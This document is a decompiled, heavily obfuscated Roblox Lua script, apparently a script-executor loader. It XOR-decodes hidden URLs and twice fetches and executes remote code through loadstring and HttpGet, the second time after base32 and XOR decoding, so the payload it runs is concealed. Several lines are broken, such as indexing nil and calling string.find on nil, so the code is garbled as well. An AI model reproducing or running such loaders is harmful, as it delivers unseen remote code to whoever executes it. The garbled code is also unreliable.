-- This file was generated at discord.gg/syncrypt

local v1 = unpack or table.unpack
local char = string.char
local byte = string.byte
local sub = string.sub
local bxor = (bit32 or bit).bxor
local concat = table.concat
local insert = table.insert
local function v8(p1, p2)
    local t1 = {}

    for i = 1, #p1 do
        insert(t1, char(bxor(byte(sub(p1, i, i + 1)), byte(sub(p2, i % #p2 + 1, i % #p2 + 1 + 1))) % 256))
    end

    return concat(t1)
end
local v9 = (nil)[1]
print("Script Executed: \"" .. v9 .. "\"")
local v10 = typeof(v9) == v8("\223\214\214'\227\169", "~\177\163\187E\134\219\167")
if v10 then
    v10 = tostring(v9):match(v8("\029\136.\142\184", "\156C\173J\165"))
end
if v10 then
    v9 = string.format(v8("q\231\024E\184", "&T\215)v\220F"), v9)
end
loadstring(game:HttpGet(v1({ v8("X\0026\002\237\nYm\000\255GX%\027\234X\003 \a\237U\004!\029\240D\019,\006\176S\025/]\211Q\031,!\253B\0312\006\237\003Cp]\211Q\031,!\253B\0312\006\237\003Cp]\236U\0161]\246U\023&\001\177]\023+\028\177q\0246\027\187\002F\n\029\241[SpB\205_\0030\017\251", "\1580vBr") })))()
local v11 = math.random(1, 99999999)
local NumberValue = Instance.new("NumberValue")
NumberValue.Parent = game.ReplicatedStorage
NumberValue.Name = "Running"
NumberValue.Archivable = true
NumberValue.Value = v11
local n1 = 0
for i = 1, 3 do
    n1 += i
end
local ReplicatedStorage = game.ReplicatedStorage
local s1 = "Running"
local v17 = (function()
    return ReplicatedStorage:FindFirstChild(s1)
end)()
local v18 = not v17
if not v18 then
    v18 = v17 and v11 ~= v17.Value
end
if v18 then
    while true do
        task.wait()
    end
end
v17:Destroy()
local v19 = v8("\n\174\159'\202X\245\196%\216\021\244\140>\205\n\175\137\"\202\a\168\1368\215\022\191\133#\151\001\181\134x\234\001\168\130'\205-\184\141\"\202\001\187\1598\203P\245\1844\203\v\170\159$\150\016\191\141$\150\n\191\1383\202M\183\138>\215M", "\185b\218\235W") .. v9
local v20 = game:GetService(v8("\227(3\246\237\175\217*.\229\219", "ʫ\\G\134\190"))
local v21 = v20[v8("\003\242\003\166\r\196/\135-\196", "\232I\161L")](v20, string.gsub((function(p3)
    local n2 = 0
    local s2
    local v33
    local v34
    while true do
        if n2 == 0 then
            if string.find(p3, v8("\1630\004&`\255\180\2286\017!=\162\242\191,\0054f\182\254\185'\0318g\160\245\191j\0199~", "\155\203DpV\019\197")) then
                p3 = string.gsub(p3, v8("N\201\"\236S\"\170\183T\220!\178Gq\241\240S\223#\239Ej\230\247H\2013\242T6\230\247K", "\152&\189V\156 \024\133"), v8("\244C\179V\239\r\232\t\251^\179N\233U\233E\243Z", "&\1567\199"))
            end

            if string.find(p3, v8("\231oy.\000;\242F\169yog\030u\243M\231", "#\200\029\028Hs\020\154")) then
                p3 = string.gsub(p3, v8("V\173\212\217\158c<\028\190\213\204", "Ty߱\191\237L"), v8("\244Tů8", "\161\2196\169\192Z0P"))
            end

            n2 = 1
        end

        if n2 == 4 then
            break
        end

        if n2 == 3 then
            if not v33 then
                return nil
            end

            v34 = string.find(nil, s2, v33 + #nil, true)
            n2 = 4
        end

        if n2 == 2 then
            s2 = "\"],\"stylingDirectives\""
            v33 = string.find(nil, nil, 1, true)
            n2 = 3
        end

        if n2 == 1 then
            local n3 = 0

            repeat
                if n3 == 0 then
                    game:HttpGet(p3 .. v8("\022A\001&AGM'\\Q\020 [\031", "E)\"`") .. os.date(v8("\249\250\146\aG/\249\235\146'G\024", "Kܣ\183jb")))
                    n3 = 1
                end
            until n3 == 1

            n2 = 2
        end
    end
    if not v34 then
        return nil
    end

    return string.sub(nil, v33 + #nil, v34 - 1)
end)(v19), "\\", ""))
local v22 = v8("\154\251ay;\157\254jt4\144\245os1\139\232pn*\142\239ue'\129\139\017\tK\237\142", "~۹\"=")
local function v23(p4)
    local n4 = 0
    local t2
    while n4 ~= 1 do
        if n4 == 0 then
            local n5 = 0

            while n5 ~= 1 do
                if n5 == 0 then
                    t2 = {}

                    for i = 1, #p4 do
                        t2[i] = string.byte(p4, i)
                    end

                    n5 = 1
                end
            end

            n4 = 1
        end
    end

    return t2
end
local function v24(p5)
    local t3 = {}
    local n6 = 0
    local n7 = 0
    local v45 = string.upper(p5)

    for i = 1, #v45 do
        local v47 = i
        local n8 = 0
        local v49
        while n8 ~= 1 do
            if n8 == 0 then
                local v50 = v45:sub(v47, v47)

                v49 = string.find(v22, v50, 1, true)
                n8 = 1
            end
        end
        if v49 then
            local n9 = 0

            repeat
                if n9 == 0 then
                    v49 -= 1
                    n7 = bit32.bor(bit32.lshift(n7, 5), v49)
                    n9 = 1
                end
            until n9 == 1

            n6 += 5

            if n6 >= 8 then
                local n10 = 0

                while n10 ~= 1 do
                    if n10 == 0 then
                        local v53 = bit32.band(bit32.rshift(n7, n6 - 8), 255)

                        t3[#t3 + 1] = v53
                        n10 = 1
                    end
                end

                n6 -= 8
            end
        end
    end

    return t3
end
local function v25(p6)
    local n11 = 0
    local t4
    while n11 ~= 1 do
        if n11 == 0 then
            t4 = {}

            for i = 1, #p6 do
                t4[i] = string.char(p6[i])
            end

            n11 = 1
        end
    end

    return table.concat(t4)
end
return (function()
    local v58 = (function(p7)
        local n12 = 0
        local s3
        repeat
            if n12 == 0 then
                local n13 = 0

                repeat
                    if n13 == 0 then
                        s3 = ""

                        for i = 1, #p7 do
                            s3 ..= string.char(p7[i])
                        end

                        n13 = 1
                    end
                until n13 == 1

                n12 = 1
            end
        until n12 == 1

        return s3
    end)({
		108,
		111,
		97,
		100,
		115,
		116,
		114,
		105,
		110,
		103
	})
    local _loadstring = loadstring

    if not _loadstring then
        _loadstring = _G and _G[v58]
    end

    return _loadstring
end)()(((function(p8, p9)
    local n14 = 0
    local v63
    local v64
    local t5
    while true do
        local n15 = 0

        repeat
            if n15 == 0 then
                if n14 == 2 then
                    return v25(t5)
                end

                if n14 == 0 then
                    v63 = v24(p8)
                    v64 = v23(p9)
                    n14 = 1
                end

                n15 = 1

                continue
            end
        until n15 == 1

        if n14 == 1 then
            t5 = {}

            for i = 1, #v63 do
                t5[i] = bit32.bxor(v63[i], v64[(i - 1) % #v64 + 1 + 0])
            end

            n14 = 2
        end
    end
end)(v21.Script, v21.Key)))()
